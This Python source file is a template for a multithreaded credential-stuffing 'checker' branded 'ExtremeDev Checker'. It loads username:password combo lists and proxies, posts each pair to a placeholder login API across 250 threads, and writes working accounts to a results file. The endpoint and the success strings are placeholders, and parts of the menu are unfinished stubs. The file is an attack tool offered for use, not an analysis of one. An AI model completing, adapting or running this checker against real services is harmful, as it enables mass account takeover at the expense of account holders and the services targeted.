from core import (
    Main as Packages
)

from logos import (
    logos, 
    change_screen,
    clear
)

# OPTIONS
refresh = 1000 # Mseconds (1000 ms = 1 second)
threads = 250
# END

try:
    import requests, threading, random
    import os, time, sys
except:
    Packages('import.error')

values = {
    "files": {
        "combos": [],
        "proxies": []
    },
    "screen": {
        "cpm": 0, "cpm1": 0, 
        "good": 0, "bad": 0, "errors": 0, 
        "customs": 0, "retries": 0,
        "checked": 0
    }
}

def Screen():
    clear(); values['cpm'] = values['cpm1']*60; values['cpm1'] = 0
    print(' Checking // Results: \n -> {} Valid(s) // {} Invalid(s) // {} Custom(s) // {} CPM\n -> {} Error(s) // {} Retry(s)')
    time.sleep(refresh//1000)
    if threading.active_count() < 5 and len(values['files']['combos']) == values['screen']['checked']:
        ... 
    else:
        threading.Thread(target=Screen, args=()).start()

def Check():
    account = random.choice(values['files']['combos'])
    values['files']['combos'].remove(account)
    b, a = account.split(':')[0], account.split(':')[1]
    try: 
        r = requests.post(
            'https://api.link/to/login',
            headers = {
                "HEADERS": "HERE"
            },
            json = {
                "username": b,
                "password": a,
                "others": ""
            }
        )
    except: 
        values['screen']['errors']+=1
        values['files']['combos'].append(account)
        return False
    if "CUSTOM RESPONSE" in r.text: values['screen']['customs']+=1; open('results/customs.txt', 'a+', encoding='utf-8').write(str(account))
    else:
        if "RIGHT RESPONSE" in r.text: values['screen']['good']+=1; open('results/valid.txt', 'a+', encoding='utf-8').write(str(account))
        elif "BAD RESPONSE" in r.text: values['screen']['bad']+=1; open('results/bad.txt', 'a+', encoding='utf-8').write(str(account))
        else: values['screen']['retries']+=1; values['files']['combos'].append(account)

class Load:
    def __init__(self, typeo=None, filename=None) -> None:
        if typeo is None: self.r = None
        else:
            if filename is None: self.filename = str(typeo)
            self.action = typeo if typeo in ['combos', 'proxies'] else self.action == 'combos'
            self.load_f()


    def load_f(self):
        try:
            file_l = open(
                '{}.txt'.format(str(self.filename)), 
                'r+',
                encoding='utf-8'
            ).readlines()
        except:
            Packages('open.error')
        if len(file_l) != 0:
            try:
                if self.action == 'combos': [values['files']['combos'].append(each) for each in file_l]
                else: [values['files']['proxies'].append(each) for each in file_l]
            except:
                Packages('load.error')
        else:
            print(' The file you entered has 0 lines, cannot parse.', end=''); time.sleep(2); sys.exit()

    
class Menu:
    def __init__(self) -> None:
        logos()
        change_screen('ExtremeDev Checker')
        print('\n Announcements: Something')
        print('\n\n [1] Checker\n [2] Options\n [3] Quit')
        try:
            inputus = input(' > ')
        except:
            print(' Please enter a valid number (1,2,3)'); time.sleep(0); Menu()
        if inputus == 1:
            ... 
        elif inputus == 2:
            ... 
        elif inputus == 3: print(' quiting..'); time.sleep(2); sys.exit()
        else: print(' Please enter a number between 1 and 3.'); time.sleep(2); Menu()

    def start(self):
        logos()
        change_screen('ExtremeDev Checker')
        print('\n Announcements: Something')
        print('Load your stuff.')
        Load()